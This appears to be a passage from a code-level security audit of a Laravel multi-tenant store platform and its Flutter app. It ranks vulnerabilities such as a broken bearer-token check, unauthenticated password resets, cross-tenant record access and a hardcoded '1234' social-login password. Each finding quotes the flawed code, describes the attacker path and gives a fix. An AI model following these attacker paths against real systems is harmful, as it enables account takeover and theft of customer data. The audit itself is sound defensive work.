---
document_title: "Store Syria — Security & Quality Audit"
phase: "Phase 0 — Discovery & Audit"
date: 2026-10-11
repo_a:
  name: "Main Platform (syriastore98)"
  remote: "github.com/fullstackfull/syriastore98"
  branch: "claude/pensive-cerf-h6rizn"
  head: "efe05d9f"
repo_b:
  name: "Associated App (StoreSyria_app98)"
  remote: "github.com/fullstackfull/StoreSyria_app98"
  branch: "claude/pensive-cerf-h6rizn"
  head: "d745ec08"
evidence_basis: >
  All findings in this document are CODE-LEVEL: they were produced by reading source files in the two
  checkouts named above and are cited as `repo path/file:line`. Nothing was executed against a database,
  no exploit was run, and no HTTP request was issued to any live host. The following checks were BLOCKED
  and are reported as BLOCKED rather than guessed: (1) Repo A `vendor/` is absent, so the PHPUnit suite,
  every `php artisan` command and all static analysis could not run — the test suite was NOT EXECUTED, it
  did not fail; (2) Repo B has no Flutter and no Dart SDK (`flutter: not found`, `dart: not found`), so
  `flutter analyze`, `flutter test` and `flutter build` could not run and it is unknown whether Repo B
  compiles; (3) no live HTTP probe of storesyria.com was possible — the sandbox egress proxy refused
  CONNECT — so every claim about what the deployed web server actually serves is labelled inference;
  (4) no database access, so production schema state and runtime settings are UNKNOWN. No secret VALUE
  appears anywhere in this document; secrets are named by variable and file:line only.
sources: >
  Auditor dossiers 10 (auth & authorization), 11 (injection, upload, secrets), 13 (testing & operational
  readiness) and 14 (Repo B Flutter audit), plus the 26 adversarial verification verdicts, which OVERRIDE
  the dossiers wherever they conflict. Load-bearing citations were independently re-opened and re-verified
  in the repositories while writing this document.
---

# Store Syria — Security & Quality Audit

**Phase 0 — Discovery & Audit · 2026-10-11**

Repo A = `syriastore98` @ `efe05d9f` (branch `claude/pensive-cerf-h6rizn`)
Repo B = `StoreSyria_app98` @ `d745ec08` (branch `claude/pensive-cerf-h6rizn`)

---

## 0. How to read this document

This is the security and quality chapter of the Phase 0 audit. It is written for a project owner making a
go/no-go investment decision, so it is organised around what is proven, what is suspected, and what is
**not** a problem.

Four conventions matter:

1. **Status vocabulary** is used exactly: VERIFIED / PARTIAL / MISSING / UNKNOWN / BLOCKED.
   **Implementation vocabulary**: IMPLEMENTED AND VERIFIED / IMPLEMENTED BUT NOT VERIFIED / PARTIALLY
   IMPLEMENTED / PLACEHOLDER OR MOCK / MISSING / UNKNOWN. **Severity**: CRITICAL / HIGH / MEDIUM / LOW.
   **Business priority**: P0 / P1 / P2 / P3.
2. **Fact vs inference is separated in every finding.** Where a conclusion rests on documented framework
   behaviour rather than on something observed here, it says so.
3. **Section 3 (REFUTED) is as important as Section 1.** Several alarming-sounding claims from the first
   audit pass did not survive adversarial checking. They are listed so that no money is spent fixing
   non-issues, and so that the real defect behind each one is named correctly.
4. **No secret value is printed.** Credentials are identified by variable name and `file:line`.

### The one-paragraph verdict

Repo A is not safely operable as a multi-tenant SaaS in its current state, and the reason is narrow enough
to be fixable. Authentication on the entire API surface is defeated by one 55-line middleware that
authenticates a bearer token by its **row id** and never compares the secret
(`repo-A app/Http/Middleware/CustomAuth.php:32-34`), and which **passes anonymous requests straight
through** when no `Authorization` header is sent (`:54`). On top of that single defect sit at least nine
independently reachable unauthenticated paths — including a password overwrite on any `users` row
(`repo-A app/Http/Controllers/StoreController.php:662-666`), seven admin list endpoints that take the
tenant from the query string (`repo-A routes/api.php:163-169`), a block of 30 order-mutation routes
outside every auth group (`repo-A routes/web.php:940-973`), and a payment-return handler that marks orders
`Paid` without ever checking whether payment succeeded
(`repo-A app/Http/Controllers/PaymentController.php:1354`). Authorization exists but is advisory: exactly
**one** of ~1,193 route registrations carries a permission middleware
(`repo-A routes/web.php:164`), `app/Policies` does not exist, and laratrust gates are disabled
(`repo-A config/laratrust.php:265`). There is **no CI, no business-logic test, and no restore capability**,
so none of this would have been caught and none of it can be regression-protected today. Repo B is a
coherent merchant console whose blockers are release-readiness rather than architecture: it logs the
merchant's password and bearer token to the device with zero release guards
(`repo-B lib/core/controller/auth/auth_controller.dart:152,164`; `grep kReleaseMode lib/` → 0 hits) and its
Android release build is signed with the debug keystore
(`repo-B android/app/build.gradle.kts:38-42`). **Go/no-go: NO-GO on live payments and NO-GO on a public
multi-tenant launch until the P0 list in Section 7 is closed.** The platform can be operated privately,
under a single trusted tenant, while that work proceeds.

---

## 1. CONFIRMED VULNERABILITIES

Every item in this section was read in source. Where the adversarial verification pass produced a
corrected severity or a corrected mechanism, the corrected wording is used and the correction is called
out explicitly.

### 1.1 Ranked table

Ranked by severity, then by how little the attacker needs.

| # | Finding | Repo | Decisive citation | Actor needed | Sev | Pri | Status |
|---|---|---|---|---|---|---|---|
| SEC-01 | API token authentication accepts any secret; no header = anonymous pass-through | A | `app/Http/Middleware/CustomAuth.php:32-34`, `:54` | none | CRITICAL | P0 | VERIFIED |
| SEC-02 | Unauthenticated password overwrite of **any** user row, incl. super admin, via `POST /store-reset-password-update/{id}` | A | `app/Http/Controllers/StoreController.php:662-666` | self-registered account | CRITICAL | P0 | VERIFIED |
| SEC-03 | Unauthenticated password reset of any `users` row via the API forgot-password endpoint | A | `app/Http/Controllers/Api/AuthController.php:396-405` | none | CRITICAL | P0 | VERIFIED |
| SEC-04 | Seven admin API list endpoints have no auth and take the tenant from the query string | A | `routes/api.php:163-169`, `app/Http/Middleware/AdminApiLog.php:19-22` | none | CRITICAL | P0 | VERIFIED |
| SEC-05 | Unauthenticated cross-tenant order IDOR chain (`order-complete` → `order/{token}`) | A | `app/Http/Controllers/OrderController.php:360-362`, `:373` | none | CRITICAL | P0 | VERIFIED |
| SEC-06 | 30 order/refund mutation routes sit outside every auth group | A | `routes/web.php:940-973` (auth group closes `:938`) | none (one GET to get a CSRF token) | CRITICAL | P0 | VERIFIED |
| SEC-07 | `status-cancel` lets anyone change any order's status and inflate stock without bound | A | `app/Http/Controllers/OrderController.php:602-615` | none | CRITICAL | P0 | VERIFIED |
| SEC-08 | Two remote-code-execution paths via zip extraction into the webroot / module autoload path | A | `app/Http/Controllers/AddonController.php:65`; `app/Http/Controllers/ModuleController.php:251`, `:279-287` | self-registered account | CRITICAL | P0 | VERIFIED |
| SEC-09 | Any self-registered merchant can rewrite or delete the global `super admin` role | A | `app/Http/Controllers/RoleController.php:156-186`, `:133` | self-registered account | CRITICAL | P0 | VERIFIED |
| SEC-10 | No framework-level tenant isolation; cross-tenant read/write through route-bound ids | A | no `app/Policies`; `config/laratrust.php:265`; `app/Http/Controllers/CouponController.php:135`, `OrderController.php:626-650` | merchant staff | CRITICAL | P0 | VERIFIED |
| SEC-37 | `UserController::update` is **both** a privilege escalation to platform super admin **and** a cross-tenant user-edit IDOR | A | `app/Http/Controllers/UserController.php:212`, `:238-244`; `app/Models/User.php:37` | any account holding `Edit User` | CRITICAL | P0 | VERIFIED |
| SEC-11 | Payment-return handler marks orders `Paid` without verifying payment | A | `app/Http/Controllers/PaymentController.php:1354`; `app/Services/PaymentService.php:365-366` | anonymous shopper | CRITICAL | P0 | VERIFIED |
| SEC-12 | Tax amount taken from the HTTP request flows into the gateway charge | A | `app/Http/Controllers/PaymentController.php:764`, `:792` | anonymous shopper | CRITICAL | P0 | VERIFIED |
| SEC-13 | Unauthenticated disclosure of any merchant's Zid orders using their decrypted credentials | A | `routes/web.php:978-980`; `app/Services/Zid.php:11,15-16` | none | CRITICAL | P0 | VERIFIED |
| SEC-14 | Unauthenticated, unsigned order-status mutation, duplicated in two places, one accepting GET | A | `routes/web.php:1026`; `routes/api.php:376-379` | none | CRITICAL | P0 | VERIFIED |
| SEC-15 | Authenticated arbitrary file write into the webroot with attacker-controlled extension | A | `app/Models/Utility.php:362,369`; `app/Http/Controllers/AppSettingController.php:164-165`; `config/filesystems.php:49` | any authenticated user | CRITICAL | P0 | VERIFIED |
| SEC-16 | `.env` with live secrets committed to git; third-party OAuth secrets hardcoded in a config file | A | `.env` tracked (commit `3c39c160`); `config/services.php:31,34` | repo read access | CRITICAL | P0 | VERIFIED |
| SEC-17 | Nine social-login addons create customers with the hardcoded password `1234` | A | `packages/workdo/GoogleLogin/.../GoogleLoginController.php:118,128` + 8 siblings | an email address | CRITICAL | P1 | VERIFIED |
| SEC-18 | PHPUnit is pointed at the live production MySQL database; `RefreshDatabase` would drop it | A | `phpunit.xml:25-26`; no `.env.testing` | a developer typing `phpunit` | CRITICAL | P0 | VERIFIED |
| SEC-19 | Backup module: no permission check on `store()`, shell injection, archives `.env`, chmod 0777, **no restore** | A | `packages/workdo/BackupRestore/.../BackupRestoreController.php:54`, `:144`, `:188-190`, `:193-194` | plan-entitled merchant or staff | CRITICAL | P0 | VERIFIED |
| SEC-20 | Repo B logs the merchant's e-mail, plaintext password and bearer token with no release guard | B | `lib/core/controller/auth/auth_controller.dart:152,164`; `lib/network/network.dart:146-158` | device/log access | CRITICAL | P0 | VERIFIED |
| SEC-21 | Repo B Android release build is signed with the debug keystore | B | `android/app/build.gradle.kts:38-42` | n/a (release blocker) | CRITICAL | P0 | VERIFIED |
| SEC-22 | SQL injection in the product-search API | A | `app/Http/Controllers/Api/ApiController.php:4495` | none | HIGH | P0 | VERIFIED |
| SEC-23 | Stored XSS: anonymous API registration → unescaped admin DataTable | A | `app/Http/Controllers/Api/AuthController.php:32,79`; `app/DataTables/CustomerDataTable.php:38,94` | none | HIGH | P0 | VERIFIED |
| SEC-24 | No API rate limiting anywhere | A | `throttleApi`/`throttle:api` → 0 hits in `bootstrap/ routes/ app/` | none | HIGH | P0 | VERIFIED |
| SEC-25 | Plaintext passwords and bearer tokens written to a log file inside the webroot | A | `app/Http/Middleware/APILog.php:30,33`; `AdminApiLog.php:30,33` | log/file access | HIGH | P0 | VERIFIED |
| SEC-26 | Three withdrawal payout endpoints have neither auth middleware nor any permission check | A | `routes/web.php:186,189,192`; `app/Http/Controllers/StoreFinanceController.php:644,719,888` | any staff account of the tenant | HIGH | P1 | VERIFIED |
| SEC-27 | Refunds never move money; the refund write has no permission check and no tenant scope | A | `app/Http/Controllers/OrderRefundController.php:229-243` | tenant staff | HIGH | P0 | VERIFIED |
| SEC-28 | 2,392 unescaped Blade sinks, no HTML sanitiser in the dependency set, no CSP | A | 2,392 `{!! !!}` occurrences; no CSP/`X-Frame-Options`/`nosniff` anywhere | merchant or customer | HIGH | P1 | VERIFIED |
| SEC-29 | CSRF exclusion list contains five unjustifiable entries, including `/login` and `*/checkout` | A | `bootstrap/app.php:33-64` | cross-site attacker | HIGH | P1 | VERIFIED |
| SEC-30 | Google 2FA is unenforceable, and one TOTP secret is shared across a whole tenant | A | `packages/workdo/GoogleAuthentication/src/routes/web.php:25-28`; `.../GoogleAuthenticationController.php:35-41` | phished password | HIGH | P1 | VERIFIED |
| SEC-31 | Session cookies issued with no `Secure` and no `SameSite` on an HTTPS site; `APP_DEBUG=true` | A | `config/session.php:172,202`; `.env:2,4,6` | network position | HIGH | P1 | VERIFIED |
| SEC-32 | Deployment serves the application root rather than `public/` | A | `index.php:17-21`; `.htaccess:25,33-36`; `error_log:1` | none | HIGH | P1 | PARTIAL |
| SEC-33 | Abandoned installer package with the HTTP `/update` migration route enabled | A | `config/installer.php:132,143`; `composer.lock` `abandoned: true` | unknown (gate state UNKNOWN) | HIGH | P1 | PARTIAL |
| SEC-34 | Repo B bearer token stored in plaintext on-device | B | `lib/utils/prefer.dart:48-54` | device access | MEDIUM-HIGH | P1 | VERIFIED |
| SEC-35 | The "XSS middleware" provides no XSS protection and silently corrupts passwords | A | `app/Http/Middleware/XSS.php:55,57` | any panel user (self-inflicted) | MEDIUM | P1 | VERIFIED |
| SEC-36 | Repo B points at the upstream vendor's demo server for the merchant avatar | B | `lib/utils/images.dart:82` | n/a (leak + dependency) | HIGH | P1 | VERIFIED |

### 1.2 Authentication defects

#### SEC-01 — API token authentication accepts any secret, and no header means anonymous access
**CRITICAL · P0 · Status VERIFIED · Implementation: IMPLEMENTED BUT BROKEN**

**Where.** `repo-A app/Http/Middleware/CustomAuth.php:21-55`, registered as the alias `custom.auth` at
`repo-A bootstrap/app.php:23`. It is the only authentication middleware on `repo-A routes/api.php`, where
it is attached to 189 route registrations.

```php
23: $token = $request->header('Authorization');
24: if ($token) {
26:     $token = substr($token, 7);
28:     $token = explode('|', $token);
29:     $tokenId = $token[0] ?? null;
32:         $tokenExists = \DB::table('personal_access_tokens')
33:         ->where('id', $tokenId)
34:         ->first();
```

**Attacker path.** A Laravel Sanctum plaintext token has the wire format `"<id>|<secret>"`. This code
splits on `|`, keeps only the **id**, looks the row up by primary key, and logs in the token's owner
(`:38` customers guard, `:41` default web guard, `:44` deliveryboy guard) — the secret half is parsed at
`:29` and then discarded. `personal_access_tokens.id` is a stock auto-increment column
(`repo-A database/migrations/2019_12_14_000001_create_personal_access_tokens_table.php:16`), so
`Authorization: Bearer 3|anything` authenticates as whoever owns row 3, and ids 1, 2, 3… enumerate every
live session on the platform — merchants, delivery boys, customers, and super admin. Separately, the
`if ($token)` at `:24` has **no else branch**: with no `Authorization` header at all, control reaches
`return $next($request);` at `:54` with no authenticated user and no error. The `401` at `:47-48` fires
only when a header *was* sent and the id did not exist.

**Why this is not a misreading.** The same codebase contains the correct comparison twenty lines from a
vulnerable call site — `repo-A app/Http/Controllers/Api/DashboardController.php:625-628` uses
`hash_equals($token->token, hash('sha256', $tokenValue))`. The hash scheme is understood; it was simply
not used in the middleware that guards the API.

**No mitigation exists.** `auth:sanctum` appears exactly once in `repo-A routes/api.php:26` and is
commented out. The only enclosing group is `Route::prefix('admin')->as('admin.')->group(` at
`repo-A routes/api.php:133`, which adds a URL prefix and a name prefix and no middleware. There is no
`app/Http/Kernel.php` (Laravel 11), and `repo-A bootstrap/app.php:31` appends one middleware to the
**web** group only. `APILog` and `AdminApiLog` are byte-identical pass-throughs
(`repo-A app/Http/Middleware/APILog.php:19-22`, `AdminApiLog.php:19-22`).

**Impact.** Complete authentication bypass across the API that Repo B depends on. Two concrete outcomes
were traced end to end: (a) forging `Bearer <id>|x` until a privileged row is hit yields a merchant or
super-admin session, from which `POST /api/admin/wallet/add-balance` (`repo-A routes/api.php:362`) passes
the in-controller laratrust and ownership checks at
`repo-A app/Http/Controllers/StoreFinanceController.php:1207-1231` *because the caller is now wearing that
owner's identity*; (b) with no header at all, `POST /api/{slug}/user-detail`
(`repo-A routes/api.php:97` → `app/Http/Controllers/Api/ApiController.php:5287-5312`) validates only that
`customer_id` is present and returns that customer's name, e-mail, mobile and delivery address, so
iterating `customer_id` enumerates the customer table.

**Residual uncertainty, stated.** That `auth()->login()` on the session-backed `web` guard persists through
a stateless API request is **inferred**, not executed — Laravel 11's `api` group omits `StartSession`.
It is supported by every admin controller consuming `auth()->user()` and by Repo B shipping against these
endpoints. If that inference were wrong, the finding degrades from impersonation to fail-open; the
header-absent path (b) needs no token and is unaffected either way.

**Remediation.** Replace the body of `CustomAuth::handle` with Sanctum's own
`PersonalAccessToken::findToken($token)`, which hashes and compares correctly, or point the alias at
`auth:sanctum` directly; make a missing header a 401. **Before shipping**, enumerate the endpoints that are
*intended* to be public — the `*-guest` routes at `repo-A routes/api.php:61,64,66,73,77,80,83,85,105,112,118,120`
look designed for anonymous browsing — and move them to a genuinely public group, or the storefront and
Repo B both break at once. Sanctum 4.0.5 is already installed (`repo-A composer.json:35`) and
`HasApiTokens` is already on both models, so no new dependency is needed.

---

#### SEC-02 — Unauthenticated-authorization password overwrite of any user, including super admin
**CRITICAL · P0 · Status VERIFIED · Implementation: IMPLEMENTED (and catastrophically wrong)**

**Where.** `repo-A routes/web.php:663` →
`repo-A app/Http/Controllers/StoreController.php:646-669`.

```php
646: public function storeResetPasswordUpdate(Request $request, $id)
649:     $validator = \Validator::make($request->all(), [
652:         'password' => 'required|confirmed|same:password_confirmation',
662:     $user = User::find($id);
664:     $user->forceFill([
665:         'password' => Hash::make($request->password),
666:     ])->save();
```

**Attacker path.** The method validates the *password field* and nothing else. There is no `isAbleTo`, no
`can()`, no `$user->type` check and no `created_by`/`current_store` ownership check anywhere in
`StoreController` (grep for `isAbleTo|can(` over the whole file returns 0). `{id}` is consumed as a **raw
integer**, whereas the GET sibling at `repo-A app/Http/Controllers/StoreController.php:640` decrypts it
with `\Crypt::decrypt($id)` — so the encrypted-id convention every Blade caller uses was dropped on the
mutating POST, making victim selection trivial integer enumeration. The route is bare: walking outward,
the only enclosing groups are `repo-A routes/web.php:326`
(`['auth','xss','setlocate','verified']`) and `repo-A routes/web.php:305` (`['web']`). Public
self-registration is open (`repo-A routes/auth.php:18`) and
`repo-A app/Http/Controllers/Auth/RegisteredUserController.php:104,111,128` creates the account with
`type = 'admin'`, `is_active = 1` and calls `Auth::login($user)` — so an **anonymous internet visitor can
self-register and reach this route in two requests**.

**Impact.** Write access to the `password` column of any row in `users`, including `type = 'super admin'`.
This is simultaneously a vertical escalation (platform takeover) and a cross-tenant account-takeover
primitive against every competing merchant. The write is silent: the handler returns
`redirect()->back()->with('success', ...)` with no notification and no audit entry, unlike
`UserController::update` which does record one (`repo-A app/Http/Controllers/UserController.php:246`).

**What does *not* block it** (each checked): CSRF applies but the attacker holds a valid token as a
legitimately logged-in user; `$fillable` is bypassed by `forceFill` by design; the `'password' => 'hashed'`
cast at `repo-A app/Models/User.php:79` does not double-hash an already-hashed value, so the chosen
plaintext authenticates; `DemoModeMiddleware` names this exact method in its restricted list at
`repo-A app/Http/Middleware/DemoModeMiddleware.php:77` but the alias at `repo-A bootstrap/app.php:28` is
applied to **zero routes**, so it is dead code.

**One scope narrowing.** Storefront customers cannot do this: they authenticate on the separate
`customers` guard against `App\Models\Customer` (`repo-A config/auth.php:43-46,75-78`), which does not
satisfy the web-guard `auth` middleware. The actor set is "any holder of a web-guard `User` session" —
every merchant owner, every staff account of any role, and any anonymous visitor who self-registers.

**Remediation.** Add a `permission:` middleware to `repo-A routes/web.php:662-663` and an in-method check
that the acting user is `super admin` **or** the target's `created_by` matches; decrypt `{id}` as the GET
sibling does; and log the action to `AuditLog`. The `permission:` mechanism already works in this codebase
(`repo-A routes/web.php:164`).

---

#### SEC-03 — Unauthenticated API password reset of any `users` row
**CRITICAL · P0 · Status VERIFIED · Implementation: IMPLEMENTED (wrong)**

**Where.** `repo-A routes/api.php:52` →
`repo-A app/Http/Controllers/Api/AuthController.php:396-405`.

```php
52: Route::post('{slug}/forgot-password-save', [AuthController::class, 'forgot_password_save'])->middleware(['APILog']);
```
```php
396: $email = $request->email;
397: $has_email = User::where('email', $email)->first();
404: $has_email->password = bcrypt($request->password);
405: $has_email->save();
```

**Attacker path.** The route's only middleware is `APILog`, whose `handle()` is a bare
`return $next($request);` (`repo-A app/Http/Middleware/APILog.php:19-22`) — there is **no authentication
middleware on this route at all**. The handler takes an e-mail and a new password and writes the hash. No
reset token, no OTP, no old-password check, no rate limit (`throttleApi`/`throttle:api` return 0 hits
repo-wide). Note the model: sibling methods in this controller operate on `Customer`, but this one queries
**`User`** — the merchants' and super-admin table. The `{slug}` segment is never validated.

**Impact.** One unauthenticated HTTP request replaces the super admin's password. Total platform
compromise. The companion defect is at
`repo-A app/Http/Controllers/Api/ApiController.php:5751-5756,5779-5782`, where `change_password` falls back
to a **request-supplied `customer_id`** when nobody is authenticated and then writes
`bcrypt($request->password)` with no old-password check — unauthenticated takeover of every customer
account by iterating an integer. (The `customer_id` rule assembled at `:5752-5754` is overwritten at
`:5767`, so it is never even validated — the intent-versus-behaviour gap is explicit in the code.)

**Verification note.** This claim was **not** part of the adversarial skeptic pass. The route line, the
middleware body and the handler body were independently re-opened and re-read while writing this document;
the quotes above are verbatim from the current working tree at `efe05d9f`.

**Remediation.** Delete `forgot_password_save`, `forgot_password_send_otp` and `forgot_password_verify_otp`
(`repo-A app/Http/Controllers/Api/AuthController.php:246-410`) and the anonymous branch of
`ApiController::change_password`. **Reuse, do not rewrite**: the *web* customer flow is materially correct —
6-digit OTP, bcrypt-stored and `Hash::check`-verified, 5-minute expiry, session-bound, store-scoped
(`repo-A app/Http/Controllers/Customer/Auth/CustomerLoginController.php:363,381-383,401,413`). Port that
implementation to the API and add `throttle:` plus an attempt counter, which neither flow has.

---

#### SEC-17 — Nine social-login addons create customers with the hardcoded password `1234`
**CRITICAL · P1 · Status VERIFIED · Implementation: IMPLEMENTED (wrong)**

**Where.** `repo-A packages/workdo/GoogleLogin/src/app/Http/Controllers/GoogleLoginController.php:118`
(`'password' => Hash::make(1234),`) and `:128`
(`Auth::guard('customers')->attempt([... 'password' => 1234 ...])`). The identical literal appears in all
nine providers; verified by grep:

| Addon | file:line |
|---|---|
| GoogleLogin | `GoogleLoginController.php:118`, `:128` |
| SignInWithSlack | `SignInWithSlackController.php:114`, `:126` |
| Signinwithgithub | `SigninwithgithubController.php:111`, `:122` |
| SignInWithFacebook | `SignInWithFacebookController.php:189` |
| SignInWithLinkedIn | `SignInWithLinkedInController.php:133` |
| SignInWithOutlook | `SignInWithOutlookController.php:174` |
| SignInWithTwitter | `SignInWithTwitterController.php:117` |
| SignInWithBitbucket | `SignInWithBitbucketController.php:112` |

(All under `repo-A packages/workdo/<Addon>/src/app/Http/Controllers/`.)

**Attacker path.** Every customer who has ever used social login has a password-equivalent of `1234`. The
attacker never touches the social provider: they submit the victim's e-mail and `1234` to the ordinary
storefront login form, which does `Hash::check($credentials['password'], $customer->password)` at
`repo-A app/Http/Controllers/Customer/Auth/CustomerLoginController.php:589`. Mass customer account
takeover, bounded only by knowing e-mail addresses.

**Impact.** Customer PII, order history and saved addresses across every store that enabled any social
login addon.

**Remediation.** Replace `Hash::make(1234)` with `Hash::make(Str::random(64))` and replace the
`attempt([... 'password' => 1234 ...])` call with `Auth::guard('customers')->login($newUser)` — the direct
form is already used in the same methods' existing-user branch (e.g. `GoogleLoginController.php:106`).
Then **force a password reset for every `Customer` row carrying a `social_id`/`social_type`/`google_id`/
`apple_id`/`facebook_id`**, because some of those customers may now be using `1234` as their real
password. Treat the ~58 addon modules that were **not** read as likely to contain comparable literals and
grep all of `packages/` for `Hash::make(1234)` and `'password' => 1234` in the same pass.

---

#### SEC-30 — Google 2FA cannot be enforced, and one TOTP secret is shared across a tenant
**HIGH · P1 · Status VERIFIED · Implementation: PARTIALLY IMPLEMENTED**

**Where.** `repo-A app/Http/Controllers/Auth/AuthenticatedSessionController.php:76-77` authenticates and
regenerates the session **first**, and only at `:120-122` *suggests* 2FA by redirecting to
`2fa.dashboard`. A redirect is not a gate. The `2fa` middleware (aliased at `repo-A bootstrap/app.php:27`)
is applied to exactly two routes, **both of which are the 2FA page itself**:

```php
25: Route::get('/2fa-verify', [HomeController::class, 'index'])->name('2fa.dashboard')->middleware('2fa');
26: Route::post('/2faVerify', function () {
27:     return redirect(request()->get('2fa_referrer'));
28: })->name('2faVerify')->middleware(['2fa']);
```
(`repo-A packages/workdo/GoogleAuthentication/src/routes/web.php:25-28`.)

**Attacker path.** With a phished or stolen password for a 2FA-enabled merchant, ignore the redirect and
request `/dashboard` directly. The session cookie is already fully authenticated. The main application
group is `['auth','xss','setlocate','verified']` (`repo-A routes/web.php:326`), and `verified` =
`EmailIsVerified`, which has an email-verification branch and a Duo2FA branch and **no Google-2FA branch**
(`repo-A app/Http/Middleware/EmailIsVerified.php:36-52`).

**Second, independent defect — shared secret.**
`repo-A packages/workdo/GoogleAuthentication/src/app/Http/Controllers/GoogleAuthenticationController.php:35-41`:

```php
35: if ($user->type == 'admin') {
36:     User::where('created_by', $user->id)
37:     ->update([
38:         'google2fa_enable' => $user->google2fa_enable,
39:         'google2fa_secret'=> $user->google2fa_secret
40:     ]);
41: }
```
When a merchant generates a secret, the **same** `google2fa_secret` is written to every user they created.
One leaked secret yields valid codes for the whole tenant, and any staff member can generate codes for
their own admin.

**Impact.** 2FA provides no protection against a compromised password, and its enrolment actively weakens
the tenant. There is also no tenant-level or platform-level "require 2FA" setting anywhere in the
codebase, so 2FA is opt-in per user only (`GoogleAuthenticationController.php:50-72` acts on
`Auth::user()->id`).

**UNKNOWN.** Whether 2FA is currently *enabled* for anyone is DB-backed and could not be read. The finding
holds either way: enabled 2FA is bypassable.

**Remediation.** Gate the authenticated route group on a session flag that is set only after successful
verification — the pattern already exists for Duo2FA at
`repo-A app/Http/Middleware/EmailIsVerified.php:46-52` and can be mirrored. Delete the secret-propagation
block at `GoogleAuthenticationController.php:35-41` and generate per-user secrets. Provide a recovery path
*before* enforcing, or anyone with `google2fa_enable=1` and a stale secret is locked out.

### 1.3 Authorization, role isolation and cross-tenant leakage

#### SEC-10 — There is no framework-level tenant isolation or authorization enforcement
**CRITICAL · P0 · Status VERIFIED · Implementation: PARTIALLY IMPLEMENTED**

This is the structural finding beneath SEC-02, SEC-09, SEC-26 and SEC-27. The adversarial pass corrected
the original wording in an important way, and the corrected version is used here.

**What is genuinely absent (verified by negative search):**

| Control | Result |
|---|---|
| Eloquent global scopes / tenant traits | 0 hits for `addGlobalScope`/`withoutGlobalScope` across `app/ packages/ config/ bootstrap/ database/ routes/` |
| `app/Policies` directory | does not exist (`ls` → No such file) |
| `$policies` array | empty — `repo-A app/Providers/AuthServiceProvider.php:15-17` |
| `authorize()` / `Gate::` calls | 0 hits in `app/` and `packages/` |
| Laratrust gates | disabled — `repo-A config/laratrust.php:265` `'permissions_as_gates' => false` |
| Laratrust teams | disabled — `repo-A config/laratrust.php:243` `'enabled' => false` |
| Routes with a permission/role middleware | **1** of ~1,193 — `repo-A routes/web.php:164` |

**What is NOT absent, and the correction matters for sizing the fix.** Tenant isolation *is* implemented,
as a pervasive manual per-query convention: `getCurrentStore()`
(`repo-A app/Helper/helper.php:357-381`) is called 1,281 times and there are **487** explicit
`where('store_id', getCurrentStore())` call sites across `app/` and `packages/`, **330** of them in `app/`
alone. Published with its command, so the owner can reproduce it:

```bash
grep -rn "where('store_id', *getCurrentStore()" app/ packages/ --include=*.php | wc -l   # 487
grep -rn "where('store_id', *getCurrentStore()" app/ --include=*.php | wc -l             # 330
grep -rnE "where\((['\"])store_id\1," app/ packages/ --include=*.php | wc -l            # 1260
```

The third command is the wider census: **1,260** `where('store_id', …)` clauses of every kind, whatever the
second argument is (a request value, a relation id, a literal). So **487** is the size of the
`getCurrentStore()` convention specifically and **1,260** is the size of tenant filtering of all kinds.
*(An earlier, non-reproducible figure circulated in a draft of this report and in dossier 10; it is not
produced by any of the three commands above and has been withdrawn in favour of them.)* Authorization *is*
implemented, with laratrust
`isAbleTo()` at 362 call sites across 59 controller files. The precise defect is twofold: (a) those
permission checks answer "may this role touch coupons/orders?" and never "does **this record** belong to
the caller's store?"; and (b) there is no backstop when a developer omits the manual filter — which happens
systematically on route-model-bound and `find($id)` single-record lookups. So the `store_id`-bearing
models — **119 of 188 model files platform-wide (57 of 95 in `app/Models/` alone)** — are
permission-protected but **not** tenant-protected. Published with its commands:

```bash
find app/Models packages -type f -name '*.php' \( -path '*/Models/*' -o -path '*/Entities/*' \) | wc -l   # 188
find app/Models packages -type f -name '*.php' \( -path '*/Models/*' -o -path '*/Entities/*' \) \
  | xargs grep -l "store_id" | wc -l                                                                     # 119
ls app/Models/*.php | wc -l                   # 95
grep -l store_id app/Models/*.php | wc -l     # 57
```

*(An earlier draft published a different pair of figures; neither was reproducible by any command and both
are withdrawn in favour of the four above.)*

**Attacker path A — authenticated merchant, cross-tenant write and delete.** Actor: a merchant owner or
staff account authenticated on the `web` guard holding the ordinary per-store `admin` role, whose bulk
permission grant includes "Edit Coupon"/"Delete Coupon"
(`repo-A app/Models/Utility.php:2689-2692`, assigned via
`repo-A database/seeders/PermissionTableSeeder.php:125-143`). `GET /coupon/{id}/edit` reaches
`repo-A app/Http/Controllers/CouponController.php:135-144`, which performs **no** permission check and
**no** store check and renders another tenant's coupon code, discount and expiry. `DELETE /coupon/{id}`
reaches `:231-241`, where `isAbleTo('Delete Coupon')` passes — because the attacker legitimately holds that
permission *for their own store* — and then `$coupon->delete()` at `:238` destroys store B's coupon. The
same shape is verified at `repo-A app/Http/Controllers/OrderController.php:626-638` (deletes another
tenant's order plus its tax, coupon and billing rows) and
`repo-A app/Http/Controllers/CategoryController.php:174-176`.

**Strictly worse, inside the same controller:**
`repo-A app/Http/Controllers/OrderController.php:640-650` (`updateStatus`) does `Order::find($id)` with
**no `isAbleTo` gate at all**, and `:677-691` (`order_assign`) validates only `exists:orders,id` /
`exists:delivery_boys,id` — i.e. "exists in *any* store" — then reassigns the order and deletes
`DeliveryEarning` rows. Both are reachable by **any** authenticated, verified user, including a
minimally-privileged staff account.

**Attacker path B — anonymous cross-tenant read.** See SEC-04.

**The telling detail.** `repo-A app/Http/Controllers/CategoryController.php:271-279` deletes
`Category::find($id)` **unfiltered** at `:276` while the child-record check at `:279` *does* filter by
`getCurrentStore()`. The convention is applied inconsistently inside a single method, which is why a fix
must be a global mechanism rather than a patch list. Counted: 126 `show`/`edit`/`update`/`destroy` actions
in `repo-A app/Http/Controllers/*.php` take a bound model or a raw `$id`; 6 were read in full and all 6
lacked a store predicate. The exact affected count is **UNKNOWN**; the pattern is VERIFIED.

**One genuine mitigation to credit.** Guard separation is real
(`repo-A config/auth.php:16-18,71-78`): shop customers authenticate on a separate `customers` guard against
`App\Models\Customer` and **cannot** reach the admin web routes. Path A requires merchant-side
credentials, not an anonymous visitor.

**Impact.** Any merchant on the platform can read, modify and destroy any other merchant's catalogue,
coupons and orders by changing an integer in a URL. For a SaaS whose whole value proposition is hosting
competing merchants side by side, this is the defining defect.

**Remediation (reuse-first, and this is the highest-risk change in the document).** Three steps, in order:
(1) add a `TenantScope` global scope to every `store_id`-bearing model, so the ~126 unscoped child queries
become safe **without editing them**; (2) introduce a middleware that resolves the tenant from the
authenticated user and **ignores** `$request->store_id`; (3) harden `getCurrentStore()`
(`repo-A app/Helper/helper.php:357-381`) as the single resolution point. Two cautions. A global scope
